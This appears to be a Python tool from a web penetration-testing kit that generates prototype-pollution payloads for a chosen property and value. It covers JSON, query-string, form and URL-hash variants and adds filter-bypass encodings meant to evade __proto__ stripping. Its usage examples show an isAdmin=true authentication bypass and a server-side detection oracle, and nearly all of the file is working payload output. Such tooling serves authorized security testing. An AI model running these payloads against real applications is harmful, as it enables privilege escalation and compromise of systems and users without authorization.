#!/usr/bin/env python3
"""
pp_payloads.py - generate the full prototype-pollution payload matrix for a property=value (authorized only).

Prototype pollution has many encodings (JSON vs query vs form vs hash) and two roots (__proto__ vs constructor.prototype).
This prints every variant for a given prop/value so you can paste the right one into the right vector, plus the
detection/auth-bypass/gadget shortcuts.

Usage:
  python3 pp_payloads.py --prop polluted --value yes            # detection marker
  python3 pp_payloads.py --prop isAdmin --value true            # auth-bypass (typed bool)
  python3 pp_payloads.py --prop json_spaces --value 10 --key "json spaces"   # SSPP oracle (key with a space)
"""
import argparse, json, urllib.parse


def typed(value):
    if value.lower() in ("true", "false"):
        return value.lower() == "true"
    if value.lstrip("-").isdigit():
        return int(value)
    return value


def main():
    ap = argparse.ArgumentParser(description="Prototype-pollution payload matrix generator (authorized only).")
    ap.add_argument("--prop", required=True, help="property name to inject onto the prototype")
    ap.add_argument("--value", default="x8bit_polluted", help="value (true/false/int auto-typed for JSON)")
    ap.add_argument("--key", help="override the literal key (e.g. 'json spaces' with a space); default = --prop")
    a = ap.parse_args()
    key = a.key or a.prop
    jval = typed(a.value)
    ek = urllib.parse.quote(key)
    ev = urllib.parse.quote(a.value)

    print(f"# prototype-pollution payloads for  {key} = {a.value!r}\n")

    print("## JSON bodies")
    print("  __proto__          : " + json.dumps({"__proto__": {key: jval}}))
    print("  constructor.proto  : " + json.dumps({"constructor": {"prototype": {key: jval}}}))
    print()
    print("## Query string (append to URL)")
    print(f"  __proto__ bracket  : ?__proto__[{ek}]={ev}")
    print(f"  __proto__ dot      : ?__proto__.{ek}={ev}")
    print(f"  constructor bracket: ?constructor[prototype][{ek}]={ev}")
    print()
    print("## Form / multipart body")
    print(f"  __proto__ bracket  : __proto__[{ek}]={ev}")
    print(f"  constructor bracket: constructor[prototype][{ek}]={ev}")
    print()
    print("## URL hash (client-side routers reading location.hash)")
    print(f"  __proto__ bracket  : #__proto__[{ek}]={ev}")
    print()
    print("## Filter-bypass variants (when __proto__ is blocked/stripped)")
    print(f"  strip-once fool    : __pro__proto__to__[{ek}]={ev}")
    print(f"  url-encoded key    : %5f%5fproto%5f%5f[{ek}]={ev}")
    print("  nested             : " + json.dumps({"__proto__": {"__proto__": {key: jval}}}))
    print()
    print("[i] Detection: confirm GLOBAL pollution (Object.prototype.<key> / ({}).<key>, or an SSPP oracle) - "
          "not mere reflection. Then land a gadget for impact. See ../PROTOTYPE_POLLUTION_TESTING_GUIDE.md.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
